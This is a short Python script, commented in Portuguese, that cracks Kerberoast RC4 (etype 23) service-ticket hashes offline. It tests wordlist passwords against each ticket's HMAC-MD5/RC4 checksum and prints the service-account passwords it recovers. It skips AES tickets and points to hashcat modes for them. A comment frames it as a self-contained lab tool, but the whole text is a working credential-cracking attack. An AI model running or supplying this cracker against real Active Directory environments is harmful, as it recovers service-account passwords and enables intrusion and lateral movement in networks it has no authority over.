#!/usr/bin/env python3
# Cracker offline minimalista p/ hashes Kerberoast RC4 ($krb5tgs$23$) — etype 23.
# Uso: kerbcrack.py <arquivo_hashes> <wordlist>
# (Em producao use hashcat -m 13100 ou john-jumbo; isto e p/ o lab ser auto-contido.)
import sys, hashlib, hmac, struct
from binascii import unhexlify

try:                                    # OpenSSL 3 desativa MD4; usa pycryptodome
    from Cryptodome.Hash import MD4
    def _md4(b): return MD4.new(b).digest()
except ImportError:
    def _md4(b): return hashlib.new('md4', b).digest()

def ntlm(pw):
    return _md4(pw.encode('utf-16-le'))

def rc4(key, data):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xff
        S[i], S[j] = S[j], S[i]
    out = bytearray(); i = j = 0
    for b in data:
        i = (i + 1) & 0xff; j = (j + S[i]) & 0xff
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) & 0xff])
    return bytes(out)

def verify(nt, checksum, edata):
    k1 = hmac.new(nt, struct.pack('<I', 2), hashlib.md5).digest()   # key usage 2 (ticket enc-part)
    k3 = hmac.new(k1, checksum, hashlib.md5).digest()
    dec = rc4(k3, edata)
    return hmac.new(k1, dec, hashlib.md5).digest() == checksum

def parse(line):
    # $krb5tgs$23$*user$realm$spn*$<checksum16>$<edata>
    body = line.strip().split('$23$', 1)[1]
    meta, rest = body.split('*$', 1)
    user = meta.strip('*').split('$')[0]
    spn  = meta.strip('*').split('$', 2)[-1]
    checksum_hex, edata_hex = rest.split('$', 1)
    return user, spn, unhexlify(checksum_hex), unhexlify(edata_hex)

hashes = [l for l in open(sys.argv[1]) if l.strip()]
words  = [w.rstrip('\n') for w in open(sys.argv[2], encoding='latin-1')]
for line in hashes:
    line = line.strip()
    if '$krb5tgs$23$' not in line:      # este cracker so faz RC4 (etype 23)
        try: spn = line.split('*')[1]
        except Exception: spn = '?'
        print('[*] %-28s ->  (AES, pulado — use hashcat -m 19600/19700)' % spn)
        continue
    user, spn, cks, ed = parse(line)
    hit = None
    for w in words:
        if verify(ntlm(w), cks, ed):
            hit = w; break
    print('[+] %-28s ->  %s' % (spn, hit if hit else '(nao quebrada com esta wordlist)'))
